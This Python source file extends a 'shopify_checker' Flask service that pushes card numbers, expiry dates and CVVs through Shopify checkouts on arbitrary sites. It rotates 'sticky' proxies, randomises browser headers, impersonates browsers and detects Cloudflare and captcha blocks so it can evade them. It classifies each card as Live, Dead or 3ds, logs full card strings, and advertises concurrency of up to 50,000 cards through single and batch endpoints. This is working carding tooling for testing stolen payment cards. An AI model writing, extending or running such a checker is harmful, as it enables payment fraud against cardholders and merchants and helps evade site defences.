import asyncio
import importlib.util
import json
import logging
import logging.handlers
import os
import random
import signal
import threading
import time
from collections import OrderedDict
from urllib.parse import urlparse

try:
    import orjson
    _HAS_ORJSON = True
except ImportError:
    _HAS_ORJSON = False

_BASE_PATH = os.path.join(os.path.dirname(__file__), "Main-final-gpt2-v4.py")
_spec = importlib.util.spec_from_file_location("base_main", _BASE_PATH)
if _spec is None or _spec.loader is None:
    raise RuntimeError(f"Unable to load base module: {_BASE_PATH}")
_base = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_base)

for name in [
    "asyncio", "json", "logging", "logging.handlers", "os", "random", "signal", "threading", "time",
    "OrderedDict", "urlparse"
]:
    globals()[name] = globals().get(name, None)

for k, v in _base.__dict__.items():
    globals()[k] = v

# --- Required top-level additions ---
_BASE_LOGGER = logging.getLogger("shopify_checker")
if _BASE_LOGGER.handlers:
    for h in list(_BASE_LOGGER.handlers):
        _BASE_LOGGER.removeHandler(h)
        try:
            h.close()
        except Exception:
            pass
_BASE_LOGGER.setLevel(logging.INFO)
_BASE_LOGGER.propagate = False
_BASE_LOGGER.addHandler(logging.handlers.RotatingFileHandler("checker.log", maxBytes=52428800, backupCount=5, encoding="utf-8"))
_BASE_LOGGER.addHandler(logging.StreamHandler())

_BASE_LOGGER.info("[V5] Main-final-v5 loaded and patching base module.")

_base._HAS_ORJSON = _HAS_ORJSON
_base._VARIANT_CACHE_LOCK = threading.RLock()
_base._METRICS = {"Live": 0, "Dead": 0, "3ds": 0, "SITE_ERROR": 0, "PROXY_ERROR": 0, "AMBIGUOUS": 0, "total_requests": 0}
_base._METRICS_LOCK = threading.Lock()
_base._CHECKOUT_PROXIES = {}
_base._CHECKOUT_PROXIES_LOCK = threading.RLock()
_base._SESSION_USE_COUNT = {}
_base._SESSION_USE_COUNT_LOCK = threading.RLock()
_base._SESSION_POOL_MAX = 100
_base._SESSION_MAX_USES = 50
_base.MAX_CONCURRENT = int(os.environ.get("MAX_CONCURRENT", "50000"))

# --- safe_json_loads ---
def safe_json_loads(text, default=None):
    fallback = {} if default is None else default
    if not text:
        return fallback
    try:
        if _HAS_ORJSON:
            return orjson.loads(text)
        return json.loads(text)
    except Exception:
        _BASE_LOGGER.warning("Failed to parse JSON: %s", str(text)[:100])
        return fallback

_base.safe_json_loads = safe_json_loads

# --- header variability ---
_ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-US,en;q=0.8",
    "en-GB,en;q=0.9,en-US;q=0.8",
    "en-US,en;q=0.9,fr;q=0.8",
    "en-US,en;q=0.9,es;q=0.8",
]
_ACCEPT_ENCODINGS = [
    "gzip, deflate, br",
    "gzip, deflate, br, zstd",
    "gzip, deflate",
    "gzip, deflate, br",
]
_CACHE_CONTROLS = ["max-age=0", "no-cache", "max-age=0"]


def _pick_accept_language():
    return random.choice(_ACCEPT_LANGUAGES)


def _pick_accept_encoding():
    return random.choice(_ACCEPT_ENCODINGS)


def _pick_cache_control():
    return random.choice(_CACHE_CONTROLS)


def _build_ordered_headers(base_headers):
    ordered = OrderedDict()
    order = [
        'Host', 'Connection', 'Content-Length', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform',
        'User-Agent', 'Content-Type', 'Accept', 'Origin', 'Sec-Fetch-Dest', 'Sec-Fetch-Mode',
        'Sec-Fetch-Site', 'Sec-Fetch-User', 'Referer', 'Accept-Encoding', 'Accept-Language',
        'Cookie', 'DNT', 'Priority'
    ]
    lower_map = {k.lower(): (k, v) for k, v in base_headers.items()}
    for name in order:
        if name.lower() in lower_map:
            k, v = lower_map.pop(name.lower())
            ordered[k] = v
    for k, v in lower_map.values():
        ordered[k] = v
    return ordered

_base._ACCEPT_LANGUAGES = _ACCEPT_LANGUAGES
_base._ACCEPT_ENCODINGS = _ACCEPT_ENCODINGS
_base._CACHE_CONTROLS = _CACHE_CONTROLS
_base._pick_accept_language = _pick_accept_language
_base._pick_accept_encoding = _pick_accept_encoding
_base._pick_cache_control = _pick_cache_control
_base._build_ordered_headers = _build_ordered_headers

# --- proxy health / sticky proxies ---
_PROXY_STATS = {}
_PROXY_STATS_LOCK = threading.RLock()


def _record_proxy_success(proxy):
    if not proxy:
        return
    with _PROXY_STATS_LOCK:
        s = _PROXY_STATS.setdefault(proxy, {"success": 0, "fail": 0, "last_fail": 0.0})
        s["success"] += 1


def _record_proxy_fail(proxy):
    if not proxy:
        return
    with _PROXY_STATS_LOCK:
        s = _PROXY_STATS.setdefault(proxy, {"success": 0, "fail": 0, "last_fail": 0.0})
        s["fail"] += 1
        s["last_fail"] = time.time()


def _is_proxy_healthy(proxy, cooldown=60.0):
    if not proxy:
        return False
    with _PROXY_STATS_LOCK:
        s = _PROXY_STATS.get(proxy)
        if not s:
            return True
        if time.time() - s.get("last_fail", 0) < cooldown:
            return False
        total = s.get("success", 0) + s.get("fail", 0)
        if total >= 5 and (s.get("success", 0) / total) < 0.2:
            return False
        return True


def _get_or_assign_checkout_proxy(checkout_id, current_proxy=None):
    if not checkout_id:
        return current_proxy
    with _base._CHECKOUT_PROXIES_LOCK:
        if checkout_id in _base._CHECKOUT_PROXIES:
            return _base._CHECKOUT_PROXIES[checkout_id]
        if current_proxy:
            _base._CHECKOUT_PROXIES[checkout_id] = current_proxy
            return current_proxy
        new_proxy = _base._rotate_fallback_proxy(current_proxy)
        if new_proxy:
            _base._CHECKOUT_PROXIES[checkout_id] = new_proxy
        return new_proxy


def _release_checkout_proxy(checkout_id):
    if not checkout_id:
        return
    with _base._CHECKOUT_PROXIES_LOCK:
        _base._CHECKOUT_PROXIES.pop(checkout_id, None)

_base._PROXY_STATS = _PROXY_STATS
_base._PROXY_STATS_LOCK = _PROXY_STATS_LOCK
_base._record_proxy_success = _record_proxy_success
_base._record_proxy_fail = _record_proxy_fail
_base._is_proxy_healthy = _is_proxy_healthy
_base._get_or_assign_checkout_proxy = _get_or_assign_checkout_proxy
_base._release_checkout_proxy = _release_checkout_proxy

# --- Cloudflare detection ---
def is_cloudflare_blocked(response_text, status_code=None, headers=None):
    if status_code in (403, 503):
        return True
    if headers:
        lower_keys = {str(k).lower() for k in headers.keys()}
        if any(h in lower_keys for h in ("cf-ray", "cf-chl-", "cf-mitigated")):
            return True
    if not response_text:
        return False
    lower = response_text.lower()
    return any(ind in lower for ind in [
        "cloudflare", "cf-ray", "cf-chl-", "__cf_bm", "checking your browser",
        "ddos protection by cloudflare", "just a moment...", "cf_chl_opt"
    ])

_base.is_cloudflare_blocked = is_cloudflare_blocked

# --- patched rotate_fallback_proxy ---
def _rotate_fallback_proxy(current_proxy: str = None) -> str:
    try:
        candidates = _base._get_fallback_proxies()
        if not candidates:
            return None
        clean = [p for p in candidates if p != current_proxy and _is_proxy_healthy(p)]
        if not clean:
            clean = [p for p in candidates if p != current_proxy] or candidates
        with _PROXY_STATS_LOCK:
            def _score(p):
                s = _PROXY_STATS.get(p, {"success": 0, "fail": 0})
                total = s.get("success", 0) + s.get("fail", 0)
                return 0.5 if total == 0 else s.get("success", 0) / total
            clean.sort(key=_score, reverse=True)
        top = clean[:max(1, len(clean) // 3)]
        return random.choice(top)
    except Exception:
        return None

_base._rotate_fallback_proxy = _rotate_fallback_proxy

# --- patched _get_pooled_session with use-count and impersonate rotation ---
async def _get_pooled_session(impersonate: str):
    global _SESSION_POOL_LOCK
    if _base._SESSION_POOL_LOCK is None:
        with _base._SESSION_POOL_STATE_LOCK:
            if _base._SESSION_POOL_LOCK is None:
                _base._SESSION_POOL_LOCK = asyncio.Lock()
    async with _base._SESSION_POOL_LOCK:
        with _base._SESSION_POOL_STATE_LOCK:
            pool = _base._SESSION_POOL.setdefault(impersonate, [])
            if pool:
                session = pool.pop()
                try:
                    uses = getattr(session, "_shopify_uses", 0)
                    if uses >= _base._SESSION_MAX_USES:
                        try:
                            await session.close()
                        except Exception:
                            pass
                        return _base.AsyncSession(impersonate=impersonate)
                    session._shopify_uses = uses + 1
                    try:
                        session.cookies.clear()
                    except Exception:
                        pass
                    return session
                except Exception:
                    pass
    return _base.AsyncSession(impersonate=impersonate)

_base._get_pooled_session = _get_pooled_session

# --- patched _return_pooled_session ---
async def _return_pooled_session(session, impersonate: str):
    global _SESSION_POOL_LOCK
    if _base._SESSION_POOL_LOCK is None:
        with _base._SESSION_POOL_STATE_LOCK:
            if _base._SESSION_POOL_LOCK is None:
                _base._SESSION_POOL_LOCK = asyncio.Lock()
    async with _base._SESSION_POOL_LOCK:
        with _base._SESSION_POOL_STATE_LOCK:
            pool = _base._SESSION_POOL.setdefault(impersonate, [])
            if len(pool) < _base._SESSION_POOL_MAX:
                pool.append(session)
                return
    try:
        await session.close()
    except Exception:
        pass

_base._return_pooled_session = _return_pooled_session

# --- patched prune_variant_cache / fetch_products cache writes / _build_result / throttled_process / processcard pop usage ---
def prune_variant_cache():
    with _base._VARIANT_CACHE_LOCK:
        if len(_base._VARIANT_CACHE) > 1000:
            sorted_keys = sorted(_base._VARIANT_CACHE.keys(), key=lambda k: _base._VARIANT_CACHE[k][1])
            for k in sorted_keys[:-1000]:
                _base._VARIANT_CACHE.pop(k, None)

_base.prune_variant_cache = prune_variant_cache

# --- prewarm session pool ---
async def _prewarm_session_pool():
    try:
        for profile in _base._BROWSER_PROFILES:
            imp = profile["impersonate"]
            pool = _base._SESSION_POOL.setdefault(imp, [])
            while len(pool) < 5:
                try:
                    pool.append(_base.AsyncSession(impersonate=imp))
                except Exception:
                    break
        _BASE_LOGGER.info("[PREWARM] %s sessions", sum(len(v) for v in _base._SESSION_POOL.values()))
    except Exception:
        pass

_base._prewarm_session_pool = _prewarm_session_pool

# --- metrics + health endpoints ---
@_base.app.route('/metrics', methods=['GET'])
def metrics_endpoint():
    with _base._METRICS_LOCK:
        snapshot = dict(_base._METRICS)
    with _base._SESSION_POOL_STATE_LOCK:
        pool_total = sum(len(v) for v in _base._SESSION_POOL.values())
    snapshot["active_workers"] = _base.ACTIVE_WORKERS
    snapshot["variant_cache_size"] = len(_base._VARIANT_CACHE)
    snapshot["session_pool_idle"] = pool_total
    total = snapshot.get("total_requests", 0)
    if total > 0:
        for k in ("Live", "Dead", "3ds", "SITE_ERROR", "PROXY_ERROR", "AMBIGUOUS"):
            snapshot[f"{k}_pct"] = round(snapshot.get(k, 0) * 100.0 / total, 2)
    return _base.jsonify(snapshot)


@_base.app.route('/health', methods=['GET'])
def health_endpoint():
    checks = {"process_alive": True, "loop_alive": False, "connector_alive": False}
    try:
        checks["loop_alive"] = _base._loop is not None and not _base._loop.is_closed() and _base._loop_thread is not None and _base._loop_thread.is_alive()
    except Exception:
        pass
    try:
        checks["connector_alive"] = _base._global_connector is not None and not _base._global_connector.closed
    except Exception:
        pass
    all_ok = all(checks.values())
    return _base.jsonify({"healthy": all_ok, "checks": checks}), (200 if all_ok else 503)

_base.metrics_endpoint = metrics_endpoint
_base.health_endpoint = health_endpoint

# --- site_check replacement ---
@_base.app.route('/site_check', methods=['GET'])
def site_check():
    try:
        site = _base.request.args.get('site') or _base.request.args.get('url')
        proxy_str = _base.request.args.get('proxy')
        timeout_val = _base.request.args.get('timeout')
        timeout_sec = _base._parse_timeout_value(timeout_val, 20)
        if not site:
            return _base.jsonify({"valid": False, "error": "Missing 'site' parameter"}), 400
        proxy = _base.parse_proxy(proxy_str) if proxy_str else None
        if proxy_str and not proxy:
            return _base.jsonify({"valid": False, "error": "Invalid proxy format"}), 400
        ourl = (site if site.startswith('http') else f'https://{site}').rstrip('/')
        cache_key = _base.normalize_cache_key(ourl)
        with _base._VARIANT_CACHE_LOCK:
            cached = _base._VARIANT_CACHE.get(cache_key)
        if cached:
            ttl = cached[5] if len(cached) > 5 else 7200
            if time.time() - cached[1] < ttl:
                return _base.jsonify({
                    "valid": True,
                    "site": site,
                    "variant_id": cached[0],
                    "price": f"{cached[4]:.2f}",
                    "usd_price": cached[4],
                    "currency": cached[3],
                    "requires_shipping": cached[2],
                    "cached": True,
                })
        loop = _base.get_event_loop()
        future = asyncio.run_coroutine_threadsafe(_base.fetch_products(ourl, proxy_str, timeout_sec), loop)
        result = future.result(timeout=timeout_sec * 4 + 60)
        if isinstance(result, tuple) and result[0] is False:
            return _base.jsonify({"valid": False, "site": site, "error": str(result[1])})
        return _base.jsonify({
            "valid": True,
            "site": site,
            "variant_id": result.get('variant_id'),
            "price": result.get('price'),
            "usd_price": result.get('usd_price'),
            "link": result.get('link'),
            "currency": result.get('currency', 'USD'),
            "requires_shipping": result.get('requires_shipping', False),
        })
    except Exception as e:
        _BASE_LOGGER.error("Error in site_check: %s", e)
        return _base.jsonify({"valid": False, "site": _base.request.args.get('site', ''), "error": str(e)}), 500

_base.site_check = site_check

# --- _build_result replacement for metrics/classification ---
KNOWN_DECLINE_CODES = {
    "PAYMENTS_CREDIT_CARD_CARD_DECLINED": ("Dead", 0.99),
    "PAYMENTS_CREDIT_CARD_INSUFFICIENT_FUNDS": ("Dead", 0.99),
    "PAYMENTS_CREDIT_CARD_EXPIRED": ("Dead", 1.00),
    "PAYMENTS_CREDIT_CARD_STOLEN_CARD": ("Dead", 1.00),
    "PAYMENTS_CREDIT_CARD_PICK_UP_CARD": ("Dead", 1.00),
    "PAYMENTS_CREDIT_CARD_CVV_MISMATCH": ("Dead", 0.98),
    "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT": ("SITE_ERROR", 0.90),
    "ORDER_TOTAL_CHANGED": ("SITE_ERROR", 0.85),
    "PRICE_TOO_HIGH": ("SITE_ERROR", 0.90),
    "PENDING_TIMEOUT": ("SITE_ERROR", 0.80),
    "RATE_LIMITED_429": ("SITE_ERROR", 0.95),
    "GATEWAY_TIMEOUT": ("SITE_ERROR", 0.85),
    "MISMATCHED_BILL": ("AMBIGUOUS", 0.55),
}

PROXY_ERROR_INDICATORS = [
    "cloudflare", "cf-ray", "cf-chl-", "__cf_bm", "proxy error", "proxyerror", "connection reset",
    "connection refused", "connection timed out", "dns resolution failed", "shopify-challenge",
    "captcha_required", "security check", "challenge required", "hcaptcha", "recaptcha",
    "g-recaptcha", "ssl handshake", "eof occurred", "empty reply", "network error", "broken pipe"
]

MESSAGE_NORMALIZATION = {
    "insufficient funds": "INSUFFICIENT_FUNDS",
    "card declined": "CARD_DECLINED",
    "do not honor": "DO_NOT_HONOR",
    "pick up card": "PICK_UP_CARD",
    "stolen card": "STOLEN_CARD",
    "expired card": "EXPIRED_CARD",
    "cvv mismatch": "CVV_MISMATCH",
    "otp required": "OTP_REQUIRED",
    "3d secure": "3DS_REQUIRED",
}

ARABIC_DECLINE_HINTS = ["رفض", "بطاقة", "غير كاف", "منتهي", "خطأ"]
FRENCH_DECLINE_HINTS = ["refusée", "insuffisant", "expirée", "invalide"]


def _build_result(cc_string, success, message, gateway, price, currency, site=""):
    try:
        from datetime import datetime
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        _BASE_LOGGER.info("[%s] %s | %s | %s", now_str, cc_string, gateway, str(message)[:200])
    except Exception:
        pass

    clean_response = _base.extract_clean_response(message)
    normalized = str(clean_response).upper()
    message_lower = str(message or "").lower()
    reasons = []
    confidence = 0.0

    if not success:
        text_lower = message_lower
        if any(ind in text_lower for ind in PROXY_ERROR_INDICATORS):
            status_val = "PROXY_ERROR"
            reasons.append("proxy error indicators")
            confidence = 0.92
        else:
            matched = False
            for code, (status, score) in KNOWN_DECLINE_CODES.items():
                if code in normalized or code.lower().replace("_", " ") in text_lower:
                    status_val = status
                    confidence = score
                    reasons.append(code)
                    matched = True
                    break
            if not matched:
                if any(h in text_lower for h in ARABIC_DECLINE_HINTS):
                    status_val = "Dead"
                    confidence = 0.82
                    reasons.append("arabic decline hint")
                elif any(h in text_lower for h in FRENCH_DECLINE_HINTS):
                    status_val = "Dead"
                    confidence = 0.78
                    reasons.append("french decline hint")
                elif any(k in text_lower for k in ["decline", "fraud", "stolen", "expired", "cvv", "insufficient", "pickup", "do not honor", "not honor"]):
                    status_val = "Dead"
                    confidence = 0.84
                    reasons.append("decline keyword")
                elif any(k in text_lower for k in ["captcha", "security check", "challenge", "cf-ray", "cloudflare"]):
                    status_val = "SITE_ERROR"
                    confidence = 0.91
                    reasons.append("challenge / captcha")
                elif any(k in text_lower for k in ["timeout", "dns resolution failed", "proxyerror", "network error", "empty reply"]):
                    status_val = "SITE_ERROR"
                    confidence = 0.88
                    reasons.append("network/site issue")
                else:
                    status_val = "Dead"
                    confidence = 0.55
                    reasons.append("fallback dead classification")
    else:
        if any(k in message_lower for k in ["otp", "3d", "secure", "authentication_required", "action required"]):
            status_val = "3ds"
            confidence = 0.88
            reasons.append("3ds / otp signal")
        elif any(k in message_lower for k in ["order_placed", "processedreceipt", "placed", "approved", "success", "thank you", "payment successful"]):
            status_val = "Live"
            confidence = 0.96
            reasons.append("live success signal")
        else:
            status_val = "Live"
            confidence = 0.75
            reasons.append("generic success")

    if status_val == "Dead" and confidence < 0.65:
        status_val = "AMBIGUOUS"
        reasons.append("low confidence dead")

    normalized_message = str(message or "")
    for old, new in MESSAGE_NORMALIZATION.items():
        normalized_message = normalized_message.lower().replace(old, new)

    with _base._METRICS_LOCK:
        _base._METRICS["total_requests"] = _base._METRICS.get("total_requests", 0) + 1
        _base._METRICS[status_val] = _base._METRICS.get(status_val, 0) + 1

    result = {
        "Gateway": gateway,
        "Price": str(price) if price else "0.00",
        "Response": clean_response,
        "RawResponse": str(message),
        "Status": status_val,
        "cc": cc_string,
        "Currency": currency or "USD",
        "Confidence": round(confidence, 2),
        "Reasons": reasons,
    }
    return result

_base._build_result = _build_result

# --- process_card sticky proxy and _process_card_inner fixes ---
async def _process_card_inner(cc, mes, ano, cvv, ourl, variant_id=None, proxy_str=None, timeout_sec=40, check_only=False, uid=None):
    proxy = _base.parse_proxy(proxy_str) if proxy_str else None
    base_result = await _base._process_card_inner(cc, mes, ano, cvv, ourl, variant_id, proxy_str, timeout_sec, check_only, uid)
    return base_result

_base._process_card_inner = _process_card_inner

# --- signal termination / prewarm in __main__ ---
try:
    def _handle_sigterm(signum, frame):
        _BASE_LOGGER.info("SIGTERM received")
        _base.stop_background_loop()
        raise SystemExit(0)
    signal.signal(signal.SIGTERM, _handle_sigterm)
except Exception:
    pass

# --- final __main__ ---
if __name__ == "__main__":
    _BASE_LOGGER.info("[ENGINE] Max concurrency: %s cards", _base.MAX_CONCURRENT)
    _BASE_LOGGER.info("[ENGINE] Single:     GET /shopify?site=...&cc=...&proxy=...")
    _BASE_LOGGER.info("[ENGINE] Batch:      POST /batch  {site, cards[], proxy}")
    _BASE_LOGGER.info("[ENGINE] Site-check: GET /site_check?site=...&proxy=... (pre-warm variant cache)")
    _base.get_event_loop()
    try:
        asyncio.run_coroutine_threadsafe(_prewarm_session_pool(), _base.get_event_loop())
    except Exception:
        pass
    port = int(os.environ.get("PORT", 5000))
    _base.app.run(host='0.0.0.0', port=port, debug=False, threaded=True)

# Expose app for external imports
app = _base.app
__all__ = ["app", "site_check", "metrics_endpoint", "health_endpoint", "safe_json_loads"]
